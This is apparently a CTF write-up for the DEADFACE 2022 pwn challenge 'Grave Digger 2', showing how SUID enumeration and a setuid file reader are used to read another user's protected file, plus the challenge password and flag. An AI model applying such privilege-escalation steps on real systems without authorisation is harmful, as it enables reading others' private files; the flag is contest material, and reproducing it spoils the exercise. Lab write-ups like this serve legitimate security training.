---
# Obsidian
tags:
- ctf
- 2022-deadface
- pwn
- linux

# Jekyll
layout: ctf
type: problem

# Problem info
ctf: 2022-deadface
category: pwn
title: Grave Digger 2
points: 100
solved: true
---

# Grave Digger 2

## Instructions

A member of DEADFACE has a sensitive file on `d34th`'s machine. See if you can find a way to read the `gravedigger2` file. Submit the flag as `flag{flag text}`.

env.deadface.io Password: `123456789q`

_Use context from **[Grave Digger 1](Grave%20Digger%201)**_

## Solution

Search for SUID files in the container:

```
crypto_vamp@da4c4c0c34da:~$ find / -perm /4000 2>/dev/null
/bin/mount
/bin/umount
/bin/su
/opt/reader
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/sudo
```

We find `/opt/reader` and discover that it can be executed as lilith:
```
crypto_vamp@da4c4c0c34da:~$ ls -lah /opt/reader
-rwsr-xr-x 1 lilith lilith 13K Sep 25 16:28 /opt/reader
```

Search for files in lilith's home directory we see 
```
crypto_vamp@da4c4c0c34da:~$ find /home/lilith -type f
/home/lilith/Documents/gravedigger2.png.txt
/home/lilith/Documents/gravedigger2
```

Using the `-h` flag on the `/opt/reader` program shows us how to use the binary.
```
crypto_vamp@da4c4c0c34da:~$ /opt/reader -h 
Reader v1.3.1. Built for collaboration with new recruits.

Syntax: reader [OPTIONS] [FILENAME | ARGUMENTS]
Options:
-h		View this help information.
-f FILENAME	Read the contents of a file.
-v		View version information

man reader for more information.
crypto_vamp@da4c4c0c34da:~$ /opt/reader -f /home/lilith/Documents/gravedigger2
█████████████████████████████████████
█████████████████████████████████████
████ ▄▄▄▄▄ █▄██▄█▀▀▄▀██▀ █ ▄▄▄▄▄ ████
████ █   █ █▀ ▀█ ▀  ▀▄▄▄▄█ █   █ ████
████ █▄▄▄█ █   ▀▀▀█▄▄▀▀▀██ █▄▄▄█ ████
████▄▄▄▄▄▄▄█ ▀▄█▄█ ▀▄▀ █▄█▄▄▄▄▄▄▄████
████ ▀▀█ █▄ ▄▀ ▀ ▄ ▀▄▄▄▄▀  ▄ ▄▀█ ████
█████ █  █▄▀ █▀██ ▄ ▀ ▀▀▄ ▄██ ▄█ ████
████ ▀  █ ▄▄ █▀█  ▀▀▄▄▄▄▀▀▀▄▀▀██▀████
████▄▀ ▀▀▄▄▀ ▀ ███▀ ▄▀▄▀▀█▄▄▄ ▄▀ ████
████▀▄▀ ▄█▄▀█▄▀▄█▄▄▀▄▄▄▄▄▀▀▄▀▄▀▄ ████
██████▄█ ▀▄█▄██ ▄ ▄▄▄ ▄██▄▀▀███▀▄████
████▄▄█▄█▄▄█ ▄██▀ ▀▀▄▄▄▄ ▄▄▄ ▀▀▄▀████
████ ▄▄▄▄▄ █▄ ▀  █▀▄ ▀▀▄ █▄█ ▄█▀▄████
████ █   █ █▄▄█▄  ▄▀▀▄▄  ▄▄ ▄▀▀▄▀████
████ █▄▄▄█ ██▀ █▀█▀▄▀  ▄▀▀▀▄███  ████
████▄▄▄▄▄▄▄█▄▄▄██▄▄█▄▄▄█▄▄▄████▄█████
█████████████████████████████████████
▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀
```

Reading the contents of this QR code gets us the flag as embedded text.

```
flag{d1091652793d0f31f53164353b6414e9}
```

## Continued On

[Grave Digger 3](Grave%20Digger%203)
